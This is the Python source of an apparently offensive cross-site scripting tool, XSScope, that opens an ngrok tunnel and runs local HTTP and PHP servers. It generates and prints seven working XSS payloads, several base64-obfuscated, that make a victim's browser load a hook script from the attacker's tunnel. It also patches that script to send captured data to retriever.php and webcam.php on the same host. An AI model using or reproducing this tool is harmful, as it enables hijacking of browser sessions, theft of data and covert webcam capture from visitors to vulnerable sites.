from http.server import HTTPServer, BaseHTTPRequestHandler
from pyngrok import ngrok
import base64
import os
from multiprocessing import Process
import time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def php_server():
    time.sleep(5)
    os.system('php -S localhost:1337')


def payloads():
#configuring ngrok authtoken
    with open('ngrok_authtoken.txt', 'r') as authtoken:
        ngrok_authtoken = authtoken.read()
    if ngrok_authtoken == "":
        print("[!] Please enter Ngrok authtoken on /ngrok_authtoken.txt")

#open a http tunnel on port 1337
    print(bcolors.FAIL + "\n        XSScope" + bcolors.ENDC + " v1.0.2\n")
    print(bcolors.OKGREEN + "[+] Setting up a HTTP Server..." + bcolors.ENDC)
    tcp_server = ngrok.connect(1337,"tcp")
    tcp_server = str(tcp_server[6:])

    print(bcolors.OKGREEN + "[+] Hosting a TCP Server on:" + bcolors.OKBLUE + " http://" + tcp_server + '\n')
    print(bcolors.OKGREEN + "[+] Use the following payloads to abuse XSS:\n----------------------------------\n" + bcolors.ENDC)
    #all the possible payloads
    payload3_script = 'var a=document.createElement("script");a.src="http://'+ tcp_server + '/xsscope.js'  + '";document.body.appendChild(a);'
    payload3_b64 = str(base64.b64encode(payload3_script.encode('utf-8')))
    payload3 = str(payload3_b64.split("b'")[1])
    payload3 = str(payload3[:-1])
    payload3 = str(payload3[:-2])

    payload1 = bcolors.FAIL + '<script src="http://' + tcp_server + '/xsscope.js"></script>' + bcolors.ENDC
    payload2 = bcolors.FAIL + """javascript:eval('var a=document.createElement(\'script\');a.src=\'http://"""+ tcp_server + """/xsscope.js\';document.body.appendChild(a)')')""" + bcolors.ENDC
    payload3_final = bcolors.FAIL + '"><input onfocus=eval(atob(this.id)) id=' + payload3 + '&#61;&#61; autofocus>' + bcolors.ENDC
    payload4 = bcolors.FAIL + '"><img src=x id=' + payload3 + '&#61;&#61; onerror=eval(atob(this.id))>' + bcolors.ENDC
    payload5 = bcolors.FAIL + '"><video><source onerror=eval(atob(this.id)) id=' + payload3  + '&#61;&#61;>' + bcolors.ENDC
    payload6 = bcolors.FAIL + '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + tcp_server  + '/xsscope.js");a.send();</script>' + bcolors.FAIL
    payload7 = bcolors.FAIL + '<script>$.getScript("//' + tcp_server  + '/xsscope.js")</script>' + bcolors.ENDC

#printing table with payload
    string = "\n----------------------------------\n"
    print(string+payload1+string+payload2+string+payload3_final+string+payload4+string+payload5+string+payload6+string+payload7+string)

#customising xsscope.js with our new generated ip       
    with open("xsscope.html") as hooker:
        code = hooker.readlines()
        code[52] = """    url: 'http://""" + tcp_server + "/webcam.php',\n"
        code[13] = "var url = 'http://" + tcp_server + "/retriever.php?xsscope='\n"
        
    with open("xsscope.html", "w") as hooker:
        hooker.writelines(code)
        
    with open("xsscope.js") as hook:
        line = hook.readlines()
        line[1] = "var url = 'http://" + tcp_server + "/retriever.php?xsscope='\n"
        line[35] = "    url: 'http://" + tcp_server + "/webcam.php',\n"
    
    with open ("xsscope.js", "w") as hook:
        hook.writelines(line)
    
        
#setting up a localhost server on 1337
    print(bcolors.OKGREEN + "\n----------------------------------\n[+] HTTP and PHP Server output:" + bcolors.ENDC)

    class Serv(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/':
                self.path = '/'
            try:
                file_to_open = open(self.path[1:]).read()
                self.send_response(200)
            except:
                file_to_open = "File not found"
                self.send_response(404)
            self.end_headers()
            self.wfile.write(bytes(file_to_open, 'utf-8'))
        
        def do_POST(self):
            if self.path == '/':
                self.path = '/'
            try:
                file_to_open = open(self.path[1:]).read()
                self.send_response(200)
            except:
                file_to_open = "File not found"
                self.send_response(404)
            self.end_headers()
            self.wfile.write(bytes(file_to_open, 'utf-8'))    
    
        def do_OPTIONS(self):
            if self.path == '/':
                self.path = '/'
            try:
                file_to_open = open(self.path[1:]).read()
                self.send_response(200)
            except:
                file_to_open = "File not found"
                self.send_response(404)
            self.end_headers()
            self.wfile.write(bytes(file_to_open, 'utf-8')) 

    try:
        httpd = HTTPServer(('localhost', 1338), Serv)
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()
        print("[!] Stopping HTTP Server... Have a nice day!")
        
thread_1 = Process(target=php_server)
thread_2 = Process(target=payloads)

thread_2.start()
thread_1.start()
